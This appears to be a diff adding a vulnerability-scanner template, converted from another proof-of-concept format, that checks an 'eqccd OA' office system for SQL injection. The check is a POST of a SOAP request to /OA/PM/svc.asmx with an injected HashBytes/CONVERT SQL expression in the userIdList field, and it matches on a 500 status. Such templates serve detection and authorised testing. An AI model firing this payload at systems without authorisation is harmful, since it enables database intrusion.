@@ -1,0 +1,24 @@
+id: yaml-poc-eqccd-eqccd_oa-sql_injection-CT-456760
+info:
+  name: Yaml Poc Eqccd Eqccd_Oa Sql_Injection Ct 456760
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-eqccd-eqccd_oa-sql_injection-CT-456760'
+  tags: sqli
+  reference: []
+http:
+- method: POST
+  path:
+  - /OA/PM/svc.asmx
+  body: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    >\n  <soap:Body>\n    <GetUsersInfo xmlns=\"http://tempuri.org/\">\n      <userIdList>LOWER(CONVERT(VARCHAR(32),HashBytes('MD5','{{r1}}'),2))</userIdList>\n\
+    \    </GetUsersInfo>\n  </soap:Body>\n</soap:Envelope>"
+  headers:
+    Content-Type: text/xml
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 500
